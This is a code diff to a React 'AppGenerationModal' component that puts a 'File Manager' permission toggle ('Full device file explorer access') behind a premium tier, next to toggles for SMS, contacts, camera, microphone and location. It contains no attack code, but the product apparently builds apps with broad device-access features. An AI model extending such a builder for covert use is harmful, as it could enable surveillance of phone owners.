@@ -179,6 +179,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setEnableSmsPermission(false);
             setEnableContactsPermission(false);
             setEnableStoragePermission(true);
+            setEnableFileManagerPermission(isPremium);
             setEnableCameraPermission(false);
             setEnableMicrophonePermission(false);
             setEnableLocationPermission(false);
@@ -231,7 +232,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [enableSmsPermission, setEnableSmsPermission] = useState(false);
     const [enableContactsPermission, setEnableContactsPermission] = useState(false);
     const [enableStoragePermission, setEnableStoragePermission] = useState(true);
-    const [enableFileManagerPermission, setEnableFileManagerPermission] = useState(true);
+    const [enableFileManagerPermission, setEnableFileManagerPermission] = useState(isPremium);
     const [enableCameraPermission, setEnableCameraPermission] = useState(false);
     const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
     const [enableLocationPermission, setEnableLocationPermission] = useState(false);
@@ -467,7 +468,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableSmsPermission', enableSmsPermission.toString());
             formData.append('enableContactsPermission', enableContactsPermission.toString());
             formData.append('enableStoragePermission', enableStoragePermission.toString());
-            formData.append('enableFileManagerPermission', enableFileManagerPermission.toString());
+            formData.append('enableFileManagerPermission', (enableFileManagerPermission && isPremium).toString());
             formData.append('enableCameraPermission', enableCameraPermission.toString());
             formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
             formData.append('enableLocationPermission', enableLocationPermission.toString());
@@ -871,30 +872,34 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                                 {/* File Manager Permission Card */}
                                 <div 
-                                    onClick={() => setEnableFileManagerPermission(!enableFileManagerPermission)}
+                                    onClick={() => {
+                                        if (!isPremium) { onUpgrade?.('File Manager Explorer', 'premium'); return; }
+                                        setEnableFileManagerPermission(!enableFileManagerPermission);
+                                    }}
                                     className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none ${
-                                        enableFileManagerPermission 
+                                        enableFileManagerPermission && isPremium
                                             ? 'bg-amber-500/10 border-2 border-amber-500/60 shadow-[0_0_16px_rgba(245,158,11,0.2)]' 
                                             : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-70 hover:opacity-100'
                                     }`}
                                 >
                                     <div className="flex items-center gap-3 min-w-0">
                                         <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
-                                            enableFileManagerPermission ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'bg-white/5 text-white/40'
+                                            enableFileManagerPermission && isPremium ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'bg-white/5 text-white/40'
                                         }`}>
                                             <Folder size={18} />
                                         </div>
                                         <div className="flex flex-col min-w-0">
                                             <div className="flex items-center gap-1.5">
-                                                <span className={`text-xs font-black truncate ${enableFileManagerPermission ? 'text-amber-200' : 'text-white'}`}>
+                                                <span className={`text-xs font-black truncate ${enableFileManagerPermission && isPremium ? 'text-amber-200' : 'text-white'}`}>
                                                     File Manager
                                                 </span>
+                                                {!isPremium && <Lock size={11} className="text-orange-400/80" />}
                                             </div>
                                             <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Full device file explorer access</span>
                                         </div>
                                     </div>
-                                    <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableFileManagerPermission ? 'bg-amber-500 shadow-[0_0_8px_#f59e0b]' : 'bg-white/10'}`}>
-                                        <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableFileManagerPermission ? 'translate-x-5' : 'translate-x-0'}`} />
+                                    <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableFileManagerPermission && isPremium ? 'bg-amber-500 shadow-[0_0_8px_#f59e0b]' : 'bg-white/10'}`}>
+                                        <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableFileManagerPermission && isPremium ? 'translate-x-5' : 'translate-x-0'}`} />
                                     </div>
                                 </div>
 
